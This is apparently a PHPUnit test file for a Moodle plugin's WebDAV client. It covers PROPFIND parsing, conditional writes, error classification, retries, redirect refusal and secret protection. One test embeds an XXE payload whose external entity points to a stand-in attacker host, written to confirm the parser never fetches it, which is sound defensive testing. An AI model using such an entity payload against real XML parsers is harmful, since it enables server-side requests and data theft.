<?php
// This file is part of Coursepilot, a plugin for Moodle - http://moodle.org/
//
// Coursepilot is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// Coursepilot is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with Coursepilot.  If not, see <https://www.gnu.org/licenses/>.

namespace local_coursepilot\webdav;

use local_coursepilot\tests\webdav\fake_webdav_transport;
use PHPUnit\Framework\Attributes\CoversClass;

/**
 * WebDAV client against an in-memory fake (Issue #489, Spec #486 §4/
 * Testing Decisions, ADR 0022): named errors, 404 distinction, silent
 * retry, conditional writes, PROPFIND parsing, folder chains and secrets.
 *
 * @package    local_coursepilot
 * @copyright  2026 Coursepilot
 * @license    https://www.gnu.org/licenses/agpl-3.0.html GNU AGPL v3 or later
 */
#[CoversClass(webdav_client::class)]
#[CoversClass(\local_coursepilot\webdav\webdav_error::class)]
final class webdav_client_test extends \advanced_testcase {
    /**
     * Fixed retry clock: the sleeper advances time rather than waiting,
     * as required by the specification.
     *
     * @return array{0: webdav_client, 1: fake_webdav_transport}
     */
    private function client(fake_webdav_transport $fake): array {
        $time = 0.0;
        $clock = static function () use (&$time): float {
            return $time;
        };
        $sleeper = static function (float $seconds) use (&$time): void {
            $time += $seconds;
        };
        return [new webdav_client($fake, $clock, $sleeper), $fake];
    }

    private function url(string $path = ''): string {
        return 'https://fake.example/dav' . $path;
    }

    public function test_propfind_lists_name_type_size_time_etag_mimetype(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->seed_folder('/dav/ordner');
        $seeded = $fake->seed_file('/dav/ordner/bild.png', 'bytes');

        $entries = $client->propfind($this->url('/ordner'), 1);

        $this->assertCount(1, $entries);
        $entry = $entries[0];
        $this->assertSame('bild.png', $entry['name']);
        $this->assertSame('file', $entry['type']);
        $this->assertSame(5, $entry['size']);
        $this->assertSame($seeded['lastmodified'], $entry['timemodified']);
        $this->assertSame($seeded['etag'], $entry['etag']);
        $this->assertSame('image/png', $entry['mimetype']);
    }

    /**
     * PROPFIND uses extension-based mimetypes (.md: document/unknown).
     * Sniffing would require extra GETs and violate zero-GET listing
     * (Issue #560, webdav_client::parse_multistatus()). Read-time sniffing
     * provides location neutrality instead.
     */
    public function test_propfind_leaves_unrecognised_extension_as_document_unknown(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->seed_folder('/dav/ordner');
        $fake->seed_file('/dav/ordner/notiz.md', "# Titel\n\nText");

        $entries = $client->propfind($this->url('/ordner'), 1);

        $this->assertSame('document/unknown', $entries[0]['mimetype']);
        $gets = array_filter($fake->requests(), static fn (array $r) => $r['method'] === 'GET');
        $this->assertCount(0, $gets, 'PROPFIND must not issue a GET to determine mimetype.');
    }

    /**
     * Pure content sniffing without network (Issue #560), following
     * file_storage::mimetype_from_file() but using already-read content.
     * Callers such as webdav_storage_port::read() have fetched the bytes anyway.
     */
    public function test_sniff_mimetype_from_content_recognises_markdown_text(): void {
        $this->assertSame(
            'text/plain',
            webdav_client::sniff_mimetype_from_content("# Titel\n\nText")
        );
    }

    /**
     * Empty content returns null, retaining document/unknown like Moodle
     * core for missing files, without calling finfo_buffer on an empty string.
     */
    public function test_sniff_mimetype_from_content_returns_null_for_empty_content(): void {
        $this->assertNull(webdav_client::sniff_mimetype_from_content(''));
    }

    public function test_propfind_percent_decodes_names(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->seed_folder('/dav/ordner');
        $fake->seed_file('/dav/ordner/späte notiz.md', 'x');

        $entries = $client->propfind($this->url('/ordner'), 1);

        $this->assertSame('späte notiz.md', $entries[0]['name']);
    }

    public function test_propfind_depth_zero_returns_only_the_resource_itself(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->seed_folder('/dav/ordner');
        $fake->seed_file('/dav/ordner/a.md', 'a');
        $fake->seed_file('/dav/ordner/b.md', 'b');

        $entries = $client->propfind($this->url('/ordner/a.md'), 0);

        $this->assertCount(1, $entries);
        $this->assertSame('a.md', $entries[0]['name']);
    }

    public function test_propfind_root_can_show_iserv_area_menu(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->as_iserv_root('/dav');
        $fake->seed_file('/dav/sollte-nicht-erscheinen.md', 'x');

        $entries = $client->propfind($this->url(), 1);

        $names = array_column($entries, 'name');
        sort($names);
        $this->assertSame(['Files', 'Groups', 'Print', 'Temp', 'Windows'], $names);
        $this->assertNotContains('sollte-nicht-erscheinen.md', $names);
    }

    public function test_get_returns_body(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->seed_file('/dav/datei.md', 'Inhalt');

        $this->assertSame('Inhalt', $client->get($this->url('/datei.md')));
    }

    public function test_get_missing_file_is_not_found(): void {
        [$client] = $this->client(new fake_webdav_transport());

        $this->expectException(webdav_error::class);
        $this->expectExceptionMessage('HTTP 404');
        try {
            $client->get($this->url('/fehlt.md'));
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::NOT_FOUND, $e->errorclass);
            throw $e;
        }
    }

    public function test_put_new_sends_if_none_match_star(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());

        $client->put_new($this->url('/neu.md'), 'Inhalt');

        $this->assertSame('Inhalt', $fake->request('GET', $this->url('/neu.md'))->body);
        $puts = array_values(array_filter($fake->requests(), static fn (array $r) => $r['method'] === 'PUT'));
        $this->assertSame('*', $puts[0]['headers']['If-None-Match']);
    }

    public function test_put_new_conflicts_when_file_already_exists(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->seed_file('/dav/da.md', 'alt');

        try {
            $client->put_new($this->url('/da.md'), 'neu');
            $this->fail('CONFLICT erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::CONFLICT, $e->errorclass);
        }
    }

    public function test_put_overwrite_sends_if_match_with_etag(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $seeded = $fake->seed_file('/dav/da.md', 'alt');

        $client->put_overwrite($this->url('/da.md'), 'neu', $seeded['etag']);

        $puts = array_values(array_filter($fake->requests(), static fn (array $r) => $r['method'] === 'PUT'));
        $this->assertSame($seeded['etag'], $puts[0]['headers']['If-Match']);
    }

    public function test_put_overwrite_conflicts_on_etag_mismatch(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->seed_file('/dav/da.md', 'alt');

        try {
            $client->put_overwrite($this->url('/da.md'), 'neu', '"veralteter-etag"');
            $this->fail('CONFLICT erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::CONFLICT, $e->errorclass);
        }
    }

    public function test_put_overwrite_without_etag_uses_lastmodified_as_weak_substitute(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->without_etags();
        $seeded = $fake->seed_file('/dav/da.md', 'alt');

        $client->put_overwrite($this->url('/da.md'), 'neu', null, $seeded['lastmodified']);

        $this->assertSame('neu', $client->get($this->url('/da.md')));
    }

    public function test_put_overwrite_without_etag_conflicts_on_stale_lastmodified(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->without_etags();
        $fake->seed_file('/dav/da.md', 'alt');

        try {
            $client->put_overwrite($this->url('/da.md'), 'neu', null, 1);
            $this->fail('CONFLICT erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::CONFLICT, $e->errorclass);
        }
    }

    public function test_mkcol_chain_creates_each_level_and_tolerates_existing_ones(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->seed_folder('/dav');

        $client->mkcol_chain($this->url(), ['faecher', 'mathe']);
        // Repeating the same chain must succeed; tolerate 405.
        $client->mkcol_chain($this->url(), ['faecher', 'mathe']);

        $entries = $client->propfind($this->url('/faecher'), 1);
        $this->assertSame('mathe', $entries[0]['name']);
        $this->assertSame('folder', $entries[0]['type']);
        $mkcols = array_filter($fake->requests(), static fn (array $r) => $r['method'] === 'MKCOL');
        $this->assertCount(4, $mkcols);
    }

    public function test_move_moves_the_entry(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->seed_file('/dav/alt.md', 'Inhalt');

        $client->move($this->url('/alt.md'), $this->url('/neu.md'));

        $this->assertSame('Inhalt', $client->get($this->url('/neu.md')));
        $this->expectException(webdav_error::class);
        $client->get($this->url('/alt.md'));
    }

    public function test_delete_removes_the_entry(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->seed_file('/dav/weg.md', 'Inhalt');

        $client->delete($this->url('/weg.md'));

        try {
            $client->get($this->url('/weg.md'));
            $this->fail('NOT_FOUND erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::NOT_FOUND, $e->errorclass);
        }
    }

    public function test_auth_rejected_for_401(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->deny_auth(401);

        try {
            $client->get($this->url('/x.md'));
            $this->fail('AUTH_REJECTED erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::AUTH_REJECTED, $e->errorclass);
        }
    }

    public function test_auth_rejected_for_403(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->deny_auth(403);

        try {
            $client->get($this->url('/x.md'));
            $this->fail('AUTH_REJECTED erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::AUTH_REJECTED, $e->errorclass);
        }
    }

    public function test_429_and_503_are_treated_as_unclear_and_retried(): void {
        $codes = [429, 503];
        foreach ($codes as $code) {
            $calls = 0;
            $transport = new class ($code, $calls) implements webdav_transport {
                public function __construct(private readonly int $code, private int $calls) {
                }
                public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                    $this->calls++;
                    if ($this->calls === 1) {
                        return new webdav_response($this->code, [], '');
                    }
                    return new webdav_response(200, [], 'ok');
                }
            };
            $time = 0.0;
            $client = new webdav_client(
                $transport,
                static function () use (&$time): float {
                    return $time;
                },
                static function (float $s) use (&$time): void {
                    $time += $s;
                },
            );
            $this->assertSame('ok', $client->get('https://fake.example/dav/x.md'), (string) $code);
        }
    }

    public function test_storage_full_is_507(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->fill_storage();

        try {
            $client->put_new($this->url('/x.md'), 'x');
            $this->fail('STORAGE_FULL erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::STORAGE_FULL, $e->errorclass);
        }
    }

    public function test_html_404_is_unclear_and_the_client_retries_silently_until_recovery(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->seed_file('/dav/x.md', 'Inhalt');
        $fake->throttle(2);

        $this->assertSame('Inhalt', $client->get($this->url('/x.md')));
    }

    public function test_unclear_is_returned_once_the_retry_budget_is_exhausted(): void {
        [$client, $fake] = $this->client(new fake_webdav_transport());
        $fake->throttle(1_000);

        try {
            $client->get($this->url('/x.md'));
            $this->fail('UNCLEAR erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::UNCLEAR, $e->errorclass);
        }
    }

    /**
     * @return array<string, array{0: int}>
     */
    public static function redirect_statuscodes(): array {
        return ['301' => [301], '302' => [302], '303' => [303], '307' => [307], '308' => [308]];
    }

    /**
     * Every 3xx is a named error (Issue #510). Following redirects could
     * send credentials to a server-chosen, possibly unencrypted URL.
     *
     * @dataProvider redirect_statuscodes
     */
    #[\PHPUnit\Framework\Attributes\DataProvider('redirect_statuscodes')]
    public function test_3xx_response_is_a_named_redirected_error_and_is_not_followed(int $statuscode): void {
        $transport = new class ($statuscode) implements webdav_transport {
            public int $calls = 0;
            public function __construct(private readonly int $statuscode) {
            }
            public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                $this->calls++;
                return new webdav_response($this->statuscode, ['location' => 'https://anderswo.example/dav/'], '');
            }
        };
        $client = new webdav_client($transport, static fn (): float => 0.0, static function (float $s): void {
        });

        try {
            $client->get('https://fake.example/dav/x.md');
            $this->fail('REDIRECTED erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::REDIRECTED, $e->errorclass);
        }
        // Exactly one request, without redirects or silent retries.
        $this->assertSame(1, $transport->calls);
    }

    /**
     * A PROPFIND 2xx response with unreadable XML is UNCLEAR rather than an
     * empty folder (Issue #510), preserving handover and legacy detection.
     */
    /**
     * A PUT 3xx is the same named error as GET, without a second PUT to
     * the server-chosen Location (Issue #510, Spec: no server-selected PUT URL).
     */
    public function test_put_on_3xx_is_redirected_and_never_repeated_at_the_server_chosen_address(): void {
        $transport = new class implements webdav_transport {
            public int $calls = 0;
            public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                $this->calls++;
                return new webdav_response(302, ['location' => 'https://anderswo.example/dav/x.md'], '');
            }
        };
        $client = new webdav_client($transport, static fn (): float => 0.0, static function (float $s): void {
        });

        try {
            $client->put_new('https://fake.example/dav/x.md', 'Inhalt');
            $this->fail('REDIRECTED erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::REDIRECTED, $e->errorclass);
        }
        $this->assertSame(1, $transport->calls, 'No second PUT to the server-selected URL.');
    }

    public function test_propfind_with_unreadable_body_on_2xx_is_unclear_not_an_empty_folder(): void {
        $transport = new class implements webdav_transport {
            public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                return new webdav_response(207, [], 'kein XML');
            }
        };
        $client = new webdav_client($transport, static fn (): float => 0.0, static function (float $s): void {
        });

        try {
            $client->propfind('https://fake.example/dav/ordner', 1);
            $this->fail('Expected UNCLEAR rather than an empty list.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::UNCLEAR, $e->errorclass);
        }
    }

    /**
     * XML parsing does not fetch external entities (Issue #510). An external
     * entity must not trigger network access. With no live network in the test,
     * request timing detects attempted fetching, which would delay or hang.
     */
    public function test_propfind_never_resolves_an_external_entity_in_the_body(): void {
        $xxe = '<?xml version="1.0"?>'
            . '<!DOCTYPE d:multistatus [<!ENTITY xxe SYSTEM "https://angreifer.invalid/loot">]>'
            . '<d:multistatus xmlns:d="DAV:"><d:response><d:href>&xxe;</d:href></d:response></d:multistatus>';
        $transport = new class ($xxe) implements webdav_transport {
            public function __construct(private readonly string $body) {
            }
            public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                return new webdav_response(207, [], $this->body);
            }
        };
        $client = new webdav_client($transport, static fn (): float => 0.0, static function (float $s): void {
        });

        $start = microtime(true);
        try {
            $client->propfind('https://fake.example/dav/ordner', 1);
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::UNCLEAR, $e->errorclass);
        }
        $this->assertLessThan(2.0, microtime(true) - $start, 'No network attempt may delay the response.');
    }

    public function test_http_urls_are_rejected(): void {
        [$client] = $this->client(new fake_webdav_transport());

        $this->expectException(\InvalidArgumentException::class);
        $client->get('http://fake.example/dav/x.md');
    }

    public function test_transport_connection_failure_becomes_unreachable(): void {
        $transport = new class implements webdav_transport {
            public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                throw new webdav_transport_exception('Zeitueberschreitung.');
            }
        };
        $client = new webdav_client($transport, static fn (): float => 0.0, static function (float $s): void {
        });

        try {
            $client->get('https://fake.example/dav/x.md');
            $this->fail('UNREACHABLE erwartet.');
        } catch (webdav_error $e) {
            $this->assertSame(webdav_error::UNREACHABLE, $e->errorclass);
        }
    }

    /**
     * Secret-protection test (Spec §3/§8): no exception includes the fake
     * instance password across all seven error classes. Each scenario builds
     * its own fake with the same secret and performs the failing operation.
     *
     * @return array<string, callable(webdav_client, fake_webdav_transport): void>
     */
    private function secret_leak_scenarios(): array {
        return [
            'not_found' => static function (webdav_client $client): void {
                $client->get('https://fake.example/dav/fehlt.md');
            },
            'unclear' => static function (webdav_client $client, fake_webdav_transport $fake): void {
                $fake->throttle(1_000);
                $client->get('https://fake.example/dav/x.md');
            },
            'auth_rejected' => static function (webdav_client $client, fake_webdav_transport $fake): void {
                $fake->deny_auth();
                $client->get('https://fake.example/dav/x.md');
            },
            'storage_full' => static function (webdav_client $client, fake_webdav_transport $fake): void {
                $fake->fill_storage();
                $client->put_new('https://fake.example/dav/x.md', 'x');
            },
            'conflict' => static function (webdav_client $client, fake_webdav_transport $fake): void {
                $fake->seed_file('/dav/da.md', 'alt');
                $client->put_new('https://fake.example/dav/da.md', 'neu');
            },
        ];
    }

    /**
     * Like secret_leak_scenarios(), for REDIRECTED: the in-memory fake
     * has no 3xx state, so use a dedicated transport.
     */
    public function test_secret_never_leaks_via_a_redirected_error(): void {
        $secret = 'g3h31m-' . uniqid();
        $transport = new class ($secret) implements webdav_transport {
            public function __construct(private readonly string $secret) {
            }
            public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                return new webdav_response(302, ['location' => 'https://anderswo.example/' . $this->secret], '');
            }
        };
        $client = new webdav_client($transport, static fn (): float => 0.0, static function (float $s): void {
        });

        try {
            $client->get('https://fake.example/dav/x.md');
            $this->fail('REDIRECTED erwartet.');
        } catch (webdav_error $e) {
            $this->assertStringNotContainsString($secret, $e->getMessage());
            $this->assertStringNotContainsString($secret, $e->errorclass);
        }
    }

    public function test_secret_never_leaks_across_any_error_class(): void {
        $secret = 'g3h31m-' . uniqid();

        foreach ($this->secret_leak_scenarios() as $name => $action) {
            $fake = new fake_webdav_transport($secret);
            [$client] = $this->client($fake);

            try {
                $action($client, $fake);
                $this->fail($name . ': a named error was expected.');
            } catch (webdav_error $e) {
                $this->assertStringNotContainsString($secret, $e->getMessage(), $name);
                $this->assertStringNotContainsString($secret, $e->errorclass, $name);
            }
        }

        // UNREACHABLE: the transport throws without ever seeing a secret.
        $transport = new class implements webdav_transport {
            public function request(string $method, string $url, array $headers = [], ?string $body = null): webdav_response {
                throw new webdav_transport_exception('Zeitueberschreitung.');
            }
        };
        try {
            (new webdav_client($transport))->get('https://fake.example/dav/x.md');
            $this->fail('UNREACHABLE erwartet.');
        } catch (webdav_error $e) {
            $this->assertStringNotContainsString($secret, $e->getMessage());
        }
    }
}
